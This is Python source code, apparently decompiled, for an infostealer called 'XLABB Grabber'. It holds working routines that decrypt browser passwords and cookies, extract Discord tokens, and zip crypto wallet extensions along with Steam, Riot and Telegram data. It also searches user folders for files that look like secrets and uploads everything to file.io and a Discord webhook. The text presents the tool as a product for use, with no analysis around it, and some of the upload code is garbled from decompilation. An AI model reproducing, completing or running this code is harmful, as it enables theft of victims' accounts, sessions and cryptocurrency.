            data = {'content': g108411NF0(), 'embeds': [{'title': 'XLABB Grabber | Passwords', 'description': f'**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})', 'color': color, 'footer': {'text': 'XLABB Grabber | Thank you for using premium.', 'icon_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'}}], 'username': 'XLABB Grabber | t.me/blxstealer', 'avatar_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&', 'attachments': []}
            L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        else:  # inserted
            if name == 'kiwi':
                data = {'content': g108411NF0(), 'embeds': [{'color': color, 'fields': [{'name': 'I Found This Files;:', 'value': link}], 'author': {'name': 'XLABB Grabber | Files'}, 'footer': {'text': 'XLABB Grabber | Thank you for using premium.', 'icon_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'}}], 'username': 'XLABB Grabber | t.me/blxstealer', 'avatar_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&', 'attachments': []}
                L04DUr118(hook, data=dumps(data).encode(), headers=headers)

def wr173F0rF113(data, name):
    path = os.getenv('TEMP') + f'\\lx{name}.txt'
    with open(path, mode='w', encoding='utf-8') as f:
        f.write('<--XLABBGrabber-->\n\n')
        for line in data:
            if line[0]!= '':
                f.write(f'{line}\n')
T0K3Ns = ''

def g3770K3N(path, arg):
    global T0K3Ns  # inserted
    if not os.path.exists(path):
        return
    path += arg
    for file in os.listdir(path):
        if file.endswith('.log') or file.endswith('.ldb'):
            for line in [x.strip() for x in open(f'{path}\\{file}', errors='ignore').readlines() if x.strip()]:
                for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}', 'mfa\\.[\\w-]{80,95}']:
                    for token in re.findall(regex, line):
                        if CH3CK70K3N(token) and token not in T0K3Ns:
                            T0K3Ns += token
                            UP104D70K3N(token, path)
P455w = []

def g37P455W(path, arg):
    global P455WC0UNt  # inserted
    if not os.path.exists(path):
        return
    pathC = path + arg + '/Login Data'
    if os.stat(pathC).st_size == 0:
        return
    tempfold = temp + 'lx' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey = path + '/Local State'
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for row in data:
        if row[0]!= '':
            for wa in k3YW0rd:
                old = wa
                if 'https' in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0] and old not in p45WW0rDs:
                    p45WW0rDs.append(old)
            P455w.append(f'UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}')
            P455WC0UNt += 1
    wr173F0rF113(P455w, 'passw')
C00K13s = []

def g37C00K13(path, arg):
    global C00K1C0UNt  # inserted
    if not os.path.exists(path):
        return
    pathC = path + arg + '/Cookies'
    if os.stat(pathC).st_size == 0:
        return
    tempfold = temp + 'lx' + ''.join((random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8))) + '.db'
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    pathKey = path + '/Local State'
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for row in data:
        if row[0]!= '':
            for wa in k3YW0rd:
                old = wa
                if 'https' in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0] and old not in c00K1W0rDs:
                    c00K1W0rDs.append(old)
            C00K13s.append(f'{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{D3CrYP7V41U3(row[2], master_key)}')
            C00K1C0UNt += 1
    wr173F0rF113(C00K13s, 'cook')

def G37D15C0rD(path, arg):
    global T0K3Ns  # inserted
    if not os.path.exists(f'{path}/Local State'):
        return
    pathC = path + arg
    pathKey = path + '/Local State'
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith('.log') or file.endswith('.ldb'):
            for line in [x.strip() for x in open(f'{pathC}\\{file}', errors='ignore').readlines() if x.strip()]:
                for token in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\\"]*', line):
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if CH3CK70K3N(tokenDecoded) and tokenDecoded not in T0K3Ns:
                        T0K3Ns += tokenDecoded
                        UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)
    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)
    for thread in thttht:
        thread.join()
    wal, ga, ot = ('', '', '')
    if not len(W411375Z1p) == 0:
        wal = '<:ETH:975438262053257236> •  Wallets\n'
        for i in W411375Z1p:
            wal += f'└─ [{i[0]}]({i[1]})\n'
    if not len(W411375Z1p) == 0:
        ga = '<:blackgengar:1111366900690202624>  •  Gaming\n'
        for i in G4M1N6Z1p:
            ga += f'└─ [{i[0]}]({i[1]})\n'
    if not len(O7H3rZ1p) == 0:
        ot = '<:black_planet:1095740276850569226>  •  Apps\n'
        for i in O7H3rZ1p:
            ot += f'└─ [{i[0]}]({i[1]})\n'
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'}
    data = {'content': g108411NF0(), 'embeds': [{'title': 'XLABB Grabber | Zips', 'description': f'{wal}\n{ga}\n{ot}', 'color': color, 'footer': {'text': 'XLABB Grabber | Thank you for using premium.', 'icon_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&'}}], 'username': 'XLABB Grabber | t.me/blxstealer', 'avatar_url': 'https://cdn.discordapp.com/attachments/1207404349177724988/1247483882857828352/Picsart_24-06-04_12-35-17-582.jpg?ex=66603166&is=665edfe6&hm=21f8dbb5c91a74c32d25411343f3b446495aead54f662fec2868a4d1c0677fed&', 'attachments': []}
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)

def Z1P73136r4M(path, arg, procc):
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f'taskkill /im {procc} /t /f >nul 2>&1', shell=True)
    zf = ZipFile(f'{pathC}/{name}.zip', 'w')
    for file in os.listdir(pathC):
        if '.zip' not in file and 'tdummy' not in file and ('user_data' not in file) and ('webview' not in file):
            zf.write(pathC + '/' + file)
    zf.close()
    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    os.remove(f'{pathC}/{name}.zip')
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = f'Metamask_{browser}'
        pathC = path + arg
    if 'ejbalbakoplchlghecdalmeeeajnimhm' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = 'Metamask_Edge'
        pathC = path + arg
    if 'djclckkglechooblngghdinmeemkbgci' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = 'Metamask_OperaGX'
        pathC = path + arg
    if 'fhbohimaelbohpjbbldcngcnapndodjp' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = f'Binance_{browser}'
        pathC = path + arg
    if 'hnfanknocfeofbddgcijnmhnfnkdnaad' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = f'Coinbase_{browser}'
        pathC = path + arg
    if 'egjidjbpglichdcondbcbdnbeeppgdph' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = f'Trust_{browser}'
        pathC = path + arg
    if 'bfnaelmomeimhlpmgjnjophhpkkoljpa' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = f'Phantom_{browser}'
        pathC = path + arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f'taskkill /im {procc} /t /f >nul 2>&1', shell=True)
    if 'Wallet' in arg:
        browser = path.split('\\')[4].split('/')[1].replace(' ', '')
        name = f'{browser}'
    else:  # inserted
        if 'Steam' in arg:
            if not os.path.isfile(f'{pathC}/loginusers.vdf'):
                return
            f = open(f'{pathC}/loginusers.vdf', 'r+', encoding='utf8')
            data = f.readlines()
            found = False
            for l in data:
                if 'RememberPassword\"\t\t\"1\"' in l:
                    found = True
            if found == False:
                return
            name = arg
    zf = ZipFile(f'{pathC}/{name}.zip', 'w')
    for file in os.listdir(pathC):
        if '.zip' not in file:
            zf.write(pathC + '/' + file)
    zf.close()
    lnik = uP104D7060F113(f'{pathC}/{name}.zip')
    os.remove(f'{pathC}/{name}.zip')
    if 'Wallet' in arg or 'eogaeaoehlef' in arg or 'koplchlghecd' in arg or ('aelbohpjbbld' in arg) or ('nocfeofbddgc' in arg) or ('bpglichdcond' in arg) or ('momeimhlpmgj' in arg):
        W411375Z1p.append([name, lnik])
    else:  # inserted
        if 'Steam' in name or 'RiotCli' in name:
            G4M1N6Z1p.append([name, lnik])
        else:  # inserted
            O7H3rZ1p.append([name, lnik])

def G47H3r411():
    """                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  """  # inserted
    global uP7Hs  # inserted
    br0W53rP47H5 = [[f'{roaming}/Opera Software/Opera GX Stable', 'opera.exe', '/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/djclckkglechooblngghdinmeemkbgci'], [f'{roaming}/Opera Software/Opera Stable', 'opera.exe', '/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/djclckkglechooblngghdinmeemkbgci'], [f'{roaming}/Opera Software/Opera Neon/User Data/Default', 'opera.exe', '/Local Storage/leveldb', '/', '/Network', '/Local Extension Settings/djclckkglechooblngghdinmeemkbgci'], [f'{local}/Google/Chrome/User Data', 'chrome.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'{local}/Google/Chrome SxS/User Data', 'chrome.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph'], [f'{local}/BraveSoftware/Brave-Browser/User Data', 'brave.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph'], [f'{local}/Yandex/YandexBrowser/User Data', 'yandex.exe', '/Default/Local Storage/leveldb', '/Default', '/Default/Network', '/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'], [f'
    d15C0rDP47H5 = [[f'{roaming}/Discord', '/Local Storage/leveldb'], [f'{roaming}/Lightcord', '/Local Storage/leveldb'], [f'{roaming}/discordcanary', '/Local Storage/leveldb'], [f'{roaming}/discordptb', '/Local Storage/leveldb']]
    P47H570Z1P = [[f'{roaming}/Atomic/Local Storage/leveldb', '\"Atomic Wallet.exe\"', 'Wallet'], [f'{roaming}/Exodus/exodus.wallet', 'Exodus.exe', 'Wallet'], ['C:\\Program Files (x86)\\Steam\\config', 'steam.exe', 'Steam'], [f'{local}/Riot Games/Riot Client/Data', 'RiotClientServices.exe', 'RiotClient']]
    Telegram = [f'{roaming}/Telegram Desktop/tdata', 'telegram.exe', 'Telegram']
    for patt in br0W53rP47H5:
        a = threading.Thread(target=g3770K3N, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in d15C0rDP47H5:
        a = threading.Thread(target=G37D15C0rD, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)
    for patt in br0W53rP47H5:
        a = threading.Thread(target=g37P455W, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)
    ThCokk = []
    for patt in br0W53rP47H5:
        a = threading.Thread(target=g37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)
    threading.Thread(target=G47H3rZ1P5, args=[br0W53rP47H5, P47H570Z1P, Telegram]).start()
    for thread in ThCokk:
        thread.join()
    DETECTED = TrU57(C00K13s)
    if DETECTED == True:
        return
    for thread in Threadlist:
        thread.join()
    uP7Hs = []
    for file in ['lxpassw.txt', 'lxcook.txt']:
        UP104D(file.replace('.txt', ''), uP104D7060F113(os.getenv('TEMP') + '\\' + file))

def uP104D7060F113(path):
    try:
        with open(path, 'rb') as file:
            pass  # postinserted
    except requests.RequestException as e:
            response = requests.post('https://file.io', files={'file': file})
                upload_data = response.json()
                if upload_data.get('success'):
                    return upload_data.get('link')
            else:  # inserted
                return False
            return False
        except Exception as e:
            return False

def K1W1F01D3r(pathF, keywords):
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + '/' + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = uP104D7060F113(pathF + '/' + file)
            ffound.append([pathF + '/' + file, url])
        else:  # inserted
            break
    K1W1F113s.append(['folder', pathF + '/', ffound])
K1W1F113s = []

def K1W1F113(path, keywords):
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + '/' + file) and '.txt' in file:
                    fifound.append([path + '/' + file, uP104D7060F113(path + '/' + file)])
                    break
                if os.path.isdir(path + '/' + file):
                    target = path + '/' + file
                    K1W1F01D3r(target, keywords)
                    break
    K1W1F113s.append(['folder', path, fifound])

def K1W1():
    user = temp.split('\\AppData')[0]
    path2search = [user + '/Desktop', user + '/Downloads', user + '/Documents']
    key_wordsFolder = ['account', 'acount', 'passw', 'secret', 'senhas', 'contas', 'backup', '2fa', 'importante', 'privado', 'exodus', 'seed', 'seedphraseexposed', 'perder', 'amigos', 'empresa', 'trabalho', 'work', 'private', 'source', 'users', 'username', 'login', 'user', 'usuario', 'log']
    key_wordsFiles = ['passw', 'mdp', 'motdepasse', 'mot_de_passe', 'login', 'secret', 'account', 'acount', 'paypal', 'banque', 'account', 'metamask', 'wallet', 'wallets', 'crypto', 'exodus', 'seed', 'seedphrasediscord', '2fa', 'code', 'memo', 'compte', 'token', 'backup', 'secret']
    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith
k3YW0rd = ['mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)']
C00K1C0UNt, P455WC0UNt = (0, 0)
c00K1W0rDs = []
p45WW0rDs = []
W411375Z1p = []
G4M1N6Z1p = []
O7H3rZ1p = []
G47H3r411()
DETECTED = TrU57(C00K13s)
if not DETECTED:
    wikith = K1W1()
    for thread in wikith:
        thread.join()
    time.sleep(0.2)
    filetext = '\n'
    for arg in K1W1F113s:
        if len(arg[2])!= 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f' <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n'
            for ffil in foldlist:
                a = ffil[0].split('/')
                fileanme = a[len(a) - 1]
                b = ffil[1]
                filetext += f'└─<:open_file_folder: [{fileanme}]({b})\n'
            filetext += '\n'
    UP104D('kiwi', filetext)